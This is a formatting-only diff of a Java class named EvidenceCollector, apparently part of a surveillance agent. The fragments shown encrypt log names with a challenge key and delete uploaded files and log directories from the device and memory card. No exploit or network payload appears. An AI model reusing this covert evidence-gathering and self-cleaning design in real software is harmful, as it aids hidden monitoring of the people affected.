@@ -63,7 +63,7 @@ public class EvidenceCollector {
 
 	/**
 	 * Self.
-	 *
+	 * 
 	 * @return the evidence collector
 	 */
 	public static EvidenceCollector self() {
@@ -98,9 +98,8 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String encryptName(final String logMask) {
-		byte[] key = Keys.self().getChallengeKey();
-		return Encryption
-				.encryptName(logMask, key[0]);
+		final byte[] key = Keys.self().getChallengeKey();
+		return Encryption.encryptName(logMask, key[0]);
 	}
 
 	// public boolean storeToMMC;
@@ -145,7 +144,7 @@ public class EvidenceCollector {
 
 	/**
 	 * Deserialize progressive.
-	 *
+	 * 
 	 * @return the int
 	 */
 	private synchronized int deserializeProgressive() {
@@ -168,8 +167,9 @@ public class EvidenceCollector {
 
 	/**
 	 * Factory.
-	 *
-	 * @param agent the agent
+	 * 
+	 * @param agent
+	 *            the agent
 	 * @return the log
 	 */
 	public synchronized Evidence factory(final Agent agent) {
@@ -205,8 +205,9 @@ public class EvidenceCollector {
 
 	/**
 	 * Make date name.
-	 *
-	 * @param date the date
+	 * 
+	 * @param date
+	 *            the date
 	 * @return the string
 	 */
 	private static String makeDateName(final Date date) {
@@ -223,9 +224,11 @@ public class EvidenceCollector {
 
 	/**
 	 * Make new name.
-	 *
-	 * @param log the log
-	 * @param logType the log type
+	 * 
+	 * @param log
+	 *            the log
+	 * @param logType
+	 *            the log type
 	 * @return the vector
 	 */
 	public synchronized Vector makeNewName(final Evidence log,
@@ -294,8 +297,9 @@ public class EvidenceCollector {
 
 	/**
 	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
-	 *
-	 * @param numFiles the num files
+	 * 
+	 * @param numFiles
+	 *            the num files
 	 * @return the int
 	 */
 
@@ -312,9 +316,11 @@ public class EvidenceCollector {
 
 	/**
 	 * Removes the log recursive.
-	 *
-	 * @param basePath the base path
-	 * @param numFiles the num files
+	 * 
+	 * @param basePath
+	 *            the base path
+	 * @param numFiles
+	 *            the num files
 	 * @return the int
 	 */
 	private int removeLogRecursive(final String basePath, final int numFiles) {
@@ -459,11 +465,11 @@ public class EvidenceCollector {
 					// #endif
 
 					map.put(plainName, file);
-				}else{
+				} else {
 					// #ifdef DEBUG
-					debug.info("wrong name, deleting: "+ fcDir + "/"+ file);
+					debug.info("wrong name, deleting: " + fcDir + "/" + file);
 					// #endif
-					File toDelete = new File(fcDir,file);
+					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
 				}
 			}
